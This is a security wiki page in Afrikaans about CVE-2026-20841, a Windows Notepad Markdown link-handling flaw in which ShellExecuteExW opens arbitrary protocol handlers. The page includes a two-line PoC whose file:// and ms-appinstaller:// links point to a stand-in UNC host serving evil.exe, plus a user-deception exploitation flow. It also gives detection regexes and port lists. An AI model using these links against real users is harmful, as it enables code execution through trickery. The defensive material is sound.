# Windows Protocol Handler / ShellExecute-misbruik (Markdown-renderers)

{{#include ../banners/hacktricks-training.md}}

Windows-toepassings wat Markdown of HTML weergee, kan geklikte teikens aan `ShellExecuteExW` oorhandig. Omdat ShellExecute geregistreerde URI-skemas en lêerassosiasies aanroep, het ’n renderer ’n eksplisiete allowlist nodig eerder as om aan te neem dat elke skakel HTTP(S) is. Die Notepad-gedrag hieronder beskryf CVE-2026-20841 en moet nie na elke renderer veralgemeen word nie.<sup>[[1]](#references)[[3]](#references)</sup>

## ShellExecuteExW-oppervlak in Windows Notepad se Markdown-modus
- Notepad kies Markdown-modus **slegs vir `.md`-uitbreidings** deur middel van ’n vaste stringvergelyking in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Ondersteunde Markdown-skakels:
  - Standaard: `[text](target)`
  - Outoskakel: `<target>` (weergawe as `[target](target)`), dus is albei sintakse relevant vir payloads en opsporing.
- Skakelklikke word in `sub_140170F60()` verwerk, wat swak filtering uitvoer en dan `ShellExecuteExW` aanroep.
- `ShellExecuteExW` stuur aan na **enige gekonfigureerde protokolhanteerder**, nie net HTTP(S) nie.<sup>[[1]](#references)</sup>

### Payload-oorwegings
- Enige `\\`-reekse in die skakel word **genormaliseer na `\`** voordat `ShellExecuteExW` dit ontvang, wat UNC-/padvorming en opsporing beïnvloed.
- `.md`-lêers is **nie by verstek met Notepad geassosieer nie**; die slagoffer moet steeds die lêer in Notepad oopmaak en op die skakel klik, maar sodra dit weergegee is, kan die skakel geklik word.
- Voorbeelde van gevaarlike skemas:<sup>[[1]](#references)</sup>
  - `file://` om ’n plaaslike/UNC-payload te lanseer.
  - `ms-appinstaller://` om App Installer-vloei te aktiveer. Ander plaaslik geregistreerde skemas kan ook misbruik word.

### Minimale PoC-Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Exploitation flow
1. Stel ’n **`.md`-lêer** saam sodat Notepad dit as Markdown weergee.
2. Sluit ’n skakel in wat ’n gevaarlike URI-skema gebruik (`file:`, `ms-appinstaller:` of enige geïnstalleerde hanteerder).
3. Lewer die lêer af (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB of soortgelyk) en oortuig die gebruiker om dit in Notepad oop te maak.
4. Wanneer daarop geklik word, word die **genormaliseerde skakel** aan `ShellExecuteExW` oorhandig, en die ooreenstemmende protokolhanteerder voer die verwysde inhoud in die gebruiker se konteks uit.<sup>[[1]](#references)[[2]](#references)</sup>

## Opsporingsidees
- Monitor die oordrag van `.md`-lêers oor poorte/protokolle wat dokumente gewoonlik aflewer: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Ontleed Markdown-skakels (standaard en outoskakels) en soek na `file:` of `ms-appinstaller:` **sonder onderskeid tussen hoof- en kleinletters**.
- Verskafferriglyne regexes om toegang tot afgeleë hulpbronne op te spoor:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Die verskafferoplossing wat deur ZDI beskryf word, beperk aanvaarde teikens tot plaaslike lêers en HTTP(S). Brei opsporing uit na ander geïnstalleerde protocol handlers soos nodig, aangesien die geregistreerde aanvaloppervlak van stelsel tot stelsel verskil.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Arbitrêre kode-uitvoering in Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
